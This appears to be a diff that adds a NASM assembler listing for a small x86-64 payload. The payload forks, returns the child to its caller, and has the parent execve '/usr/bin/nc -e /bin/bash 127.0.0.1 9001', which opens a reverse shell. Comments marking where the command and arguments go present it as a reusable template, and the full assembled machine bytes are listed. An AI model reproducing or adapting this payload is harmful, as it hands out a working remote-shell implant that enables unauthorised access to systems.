@@ -1,0 +1,79 @@
+     1                                  DEFAULT REL
+     2                                  
+     3                                  ; nasm -f elf64 -o call_me.o call_me.asm -l call_me.assembly -O0
+     4                                  ; ld -m elf_x86_64 -o call_me call_me.o
+     5                                  
+     6                                  global _start
+     7                                  
+     8                                  section .text
+     9                                  
+    10                                  _start:
+    11                                  
+    12 00000000 4889E5                    mov  rbp, rsp; build stack
+    13 00000003 4881EC48000000            sub  rsp, 0x48
+    14                                  
+    15 0000000A 4831C9                    xor   rcx, rcx ; clear stack
+    16 0000000D 51                        push  rcx
+    17 0000000E 51                        push  rcx
+    18 0000000F 51                        push  rcx
+    19 00000010 51                        push  rcx
+    20 00000011 51                        push  rcx
+    21 00000012 59                        pop   rcx
+    22 00000013 59                        pop   rcx
+    23 00000014 59                        pop   rcx
+    24 00000015 59                        pop   rcx
+    25 00000016 59                        pop   rcx
+    26                                  
+    27 00000017 48B839000000000000-       mov  rax, 57 ; sys_fork
+    27 00000020 00                 
+    28 00000021 0F05                      syscall
+    29                                  
+    30 00000023 488D0D13000000            lea    rcx, [rel _child] ; move child address to rcx
+    31 0000002A 488D1D17000000            lea    rbx, [rel _parent] ; move parent address to rbx
+    32 00000031 483D00000000              cmp    rax, 0 ; check if parent
+    33 00000037 480F44CB                  cmove  rcx, rbx ; conditional move rbx to rcx if parent
+    34 0000003B FFE1                      jmp    rcx ; jump to rcx
+    35                                  
+    36                                  _child:
+    37 0000003D 4881C448000000            add  rsp, 0x48 ; break down stack
+    38 00000044 4889EC                    mov  rsp, rbp
+    39 00000047 C3                        ret ; return to program call
+    40                                  
+    41                                  _parent:
+    42 00000048 48B83B000000000000-       mov  rax, 59  ; execve
+    42 00000051 00                 
+    43                                  
+    44 00000052 488D0D54000000            lea   rcx, [rel arg4] ; push arguments
+    45 00000059 51                        push  rcx
+    46                                  
+    47 0000005A 488D0D42000000            lea   rcx, [rel arg3] ; push arguments
+    48 00000061 51                        push  rcx
+    49                                  
+    50 00000062 488D0D30000000            lea   rcx, [rel arg2] ; push arguments
+    51 00000069 51                        push  rcx
+    52                                  
+    53 0000006A 488D0D25000000            lea   rcx, [rel arg1] ; push arguments
+    54 00000071 51                        push  rcx
+    55                                  
+    56 00000072 488D0D11000000            lea   rcx, [rel arg0] ; push command
+    57 00000079 51                        push  rcx
+    58                                  
+    59 0000007A 488D3D09000000            lea  rdi, [rel arg0] ; cmd
+    60 00000081 488D3424                  lea  rsi, [rsp] ; args
+    61 00000085 4831D2                    xor  rdx, rdx ; env
+    62 00000088 0F05                      syscall
+    63                                  
+    64                                  ; /usr/bin/nc -e /bin/bash 127.0.0.1 9001
+    65                                  
+    66 0000008A 2F7573722F62696E2F-     arg0: db "/usr/bin/nc", 0 ; COMMAND GOES HERE
+    66 00000093 6E6300             
+    67 00000096 2D6500                  arg1: db "-e", 0 ; ARGUMENTS GO HERE
+    68 00000099 2F62696E2F62617368-     arg2: db "/bin/bash",0
+    68 000000A2 00                 
+    69 000000A3 3132372E302E302E31-     arg3: db "127.0.0.1",0
+    69 000000AC 00                 
+    70 000000AD 3930303100              arg4: db "9001",0
+    71                                  
+    72                                  
+    73                                  
+    74                                  
